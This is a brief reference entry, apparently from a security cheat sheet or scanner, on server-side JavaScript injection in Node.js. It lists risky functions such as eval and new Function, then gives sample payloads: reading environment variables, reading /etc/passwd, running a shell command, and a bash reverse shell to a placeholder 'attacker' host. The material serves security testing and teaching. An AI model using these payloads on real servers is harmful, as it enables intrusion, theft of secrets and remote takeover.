Server-Side JavaScript Injection

Code injection in Node.js/server-side JavaScript applications.

Dangerous Functions

  • eval() Injection - Direct code execution
  • Function Constructor - new Function()
  • setTimeout String - Delayed execution

False Positives

  • Safe Handling - Input as data only

Common Payloads

// Environment access
process.env

// File read
require('fs').readFileSync('/etc/passwd','utf8')

// Command execution
require('child_process').execSync('id').toString()

// Reverse shell
require('child_process').exec('bash -i >& /dev/tcp/attacker/4444 0>&1')
